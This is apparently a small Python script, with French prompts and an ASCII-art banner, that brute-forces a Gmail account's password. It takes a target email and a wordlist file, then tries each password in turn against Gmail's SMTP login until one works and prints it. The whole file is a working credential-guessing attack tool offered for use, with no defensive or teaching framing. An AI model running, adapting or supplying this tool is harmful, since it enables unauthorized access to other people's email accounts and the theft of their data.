import os
import smtplib
from termcolor import colored

prompt = "#<SunPortal># ~ "

def main():
	os.system("clear")
	print(colored(banner,"magenta",attrs=["bold"]))
	print(colored(title, "yellow"))

	print(colored(prompt+"Connexion au serveur SMTP de GMAIL...","yellow"))
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls() #Encryption paquets
	user = input(prompt+"Entrez l'email à bruteforce: ")
	mdps = input(prompt+"Entrez le chemin vers le fichier de mots de passes: ")

	fichier = open(mdps,"r")
	for mdp in fichier.readlines():
		mdp = mdp.strip("\n")

		try:
			print(colored(prompt+"Essai de "+mdp+"...","yellow"))
			smtpserver.login(user,mdp)
			print(colored(prompt+"MOT DE PASSE TROUVE: "+mdp+"!!\n\n","green",attrs=["bold"]))
			break
		except smtplib.SMTPAuthenticationError as e:
			print(e)
			pass

banner=("  _____ __    __   __      _ _____   ____   ______ ________ ____   _____\n"
" / ____\) )  ( (  /  \    / |  __ \ / __ \ (   __ (___  ___|    ) (_   _)\n"
"( (___ ( (    ) )/ /\ \  / / ) )_) ) /  \ \ ) (__) )  ) )  / /\ \   | |\n"
" \___ \ ) )  ( ( ) ) ) ) ) )(  ___( ()  () |    __/  ( (  ( (__) )  | |\n"
"     ) | (    ) | ( ( ( ( (  ) )  ( ()  () )) \ \  _  ) )  )    (   | |   ___\n"
" ___/ / ) \__/ (/ /  \ \/ / ( (    \ \__/ /( ( \ \_))( (  /  /\  \__| |___) )\n"
"/____/  \______(_/    \__/  /__\    \____/  )_) \__/ /__\/__(  )__\________/")

title="\t\t     GMAIL Bruteforce by b64-Sm9yZGFuIExBSVJFUw\n"
main()
